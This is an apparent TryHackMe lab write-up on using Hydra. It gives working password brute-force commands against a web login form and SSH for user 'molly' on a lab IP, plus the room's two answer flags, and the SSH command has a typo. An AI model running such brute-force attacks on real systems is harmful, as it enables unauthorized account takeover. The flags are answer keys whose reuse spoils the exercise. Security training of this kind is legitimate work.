# Hydra

### Using Hydra
- Use Hydra to bruteforce molly's web password. What is flag 1?<br />
The command that worked for me is `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.85.56 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect " -V`:<br />
![image](https://github.com/user-attachments/assets/ed3c8273-a6e1-4872-80e8-a06ce641f902)<br />
Now log into molly's account to get the flag: <br />
![image](https://github.com/user-attachments/assets/3e8f9f88-47cc-4ec0-a229-c3bd4d8b8bd1)<br />
LOL <br />
`THM{2673a7dd116de68e85c48ec0b1f2612e}`
- Use Hydra to bruteforce molly's SSH password. What is flag 2? <br />
The command is `ydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.85.56 ssh`<br />
![image](https://github.com/user-attachments/assets/1fa97639-c571-410e-a177-a5340bd49f70)<br />
Now log into molly's account `ssh molly@10.10.85.56`<br />
![image](https://github.com/user-attachments/assets/7ddbf963-d1e0-4a8b-bc4e-7c94235c73b1)<br />
`THM{c8eeb0468febbadea859baeb33b2541b}`

